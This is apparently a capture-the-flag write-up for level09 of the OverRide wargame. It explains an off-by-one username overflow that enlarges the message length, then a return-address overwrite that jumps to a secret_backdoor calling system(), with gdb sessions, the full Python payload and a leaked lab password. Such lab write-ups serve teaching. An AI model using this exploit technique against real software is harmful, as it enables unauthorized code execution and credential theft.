RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09

We notice that we are in x86_64 so we have some difference between the 32.

We see that we have a function secret_backdoor which call system() with the command that we put in fgets:
int secret_backdoor()
{
	char s[128]; // [rsp+0h] [rbp-80h] BYREF

	fgets(s, 128, stdin);
	return system(s);
}

So we just have to find a way to call this function with a bufferoverflow, like we did in many previous levels.
The main function just call handle_msg function.
We see that handle_msg function has a buffer of 192.

We have set_msg function to store a message and set_username to sotre username.


	MESSAGE --> 0			USERNAME --> 140				MSG_LEN --> 180
|                 |								|	


MESSAGE : (char *)a1 --> We are a the start of  a1 (v1)
USERNAME : (a1 + i + 140) --> We are at 140
We can wrtie from 140 to 180 included !! : for ( i = 0; i <= 40 && s[i]; ++i )
MSG_LEN : (a1 + i + 180) --> We are at 180. Define the len of our message

Notre msg_len est de 140 : 0x00005555555548ff <+63>:	movl   $0x8c,-0xc(%rbp)
>>> 0x8c
140
So we can overflow of 1 byte with our username,
for overwrite the msg_lg and have a message with bigger len (255 max because we only overflow 1 byte).

Thanks to this, we will be able to write a message of 255 characters and therefore potentially overflow the return address of the main function (although we still need to find the offset).

	MESSAGE --> 0 --> 255				USERNAME --> 140				MSG_LEN --> 180
|                	 		|			A*40 + 255 en hexa				| Overwritted by 255 in hexa

So we write 40 char + \xff (= 255 in decimal) and then we put our pattern to determine the offset.

(gdb) run < <(python -c 'print 40 * "A" + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
Starting program: /home/users/level09/level09 < <(python -c 'print 40 * "A" + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()


We have a segfault, perfect, it was just what we wanted.
Now we print the stack to now where we overwrite the return address of the main function.

(gdb) x/s $rsp
0x7fffffffe5c8:	 "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"

We just have to calculate the number of characters between the start of the string and this 6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.
We have 200 characters. --> This is our offset.

Find the address of secret_backdoor :

(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>

We want to overwrite the return address of the main function, with the address of secret_backdoor.
We have to convert the address of secret_backdoor to little endian.
0x55555555488c  = \x8c\x48\x55\x55\x55\x55\x00\x00

We add \x00\x00 because we are in 64 bytes, so we have 8 bytes.

Now we have to add to our payload : 
the offset to the address of secret_backdoor
the address of secret_backdoor
a "\n" to simulate the enter key
and cat the .pass with cat /home/users/end/.pass, it will be call with system (in secret_backdoor)

We have something like this :

A*40 + \xff + \n + A*200 + address of secret_backdoor + \n + cat /home/users/end/.pass

A*40 + \xff --> Overwrite the len of strncpy of set_msg,
so we can do a BufferOverflow.
A*200 --> Offset to the return address of main
address of secret_backdoor --> Overwrite the return address of main
cat /home/users/end/.pass --> Call system("/bin/cat /home/users/end/.pass")

(python -c 'print 40 * "A" + "\xff" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "cat /home/users/end/.pass"' ) | ./level09

level09@OverRide:~$ (python -c 'print 40 * "A" + "\xff" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "cat /home/users/end/.pass"' ) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)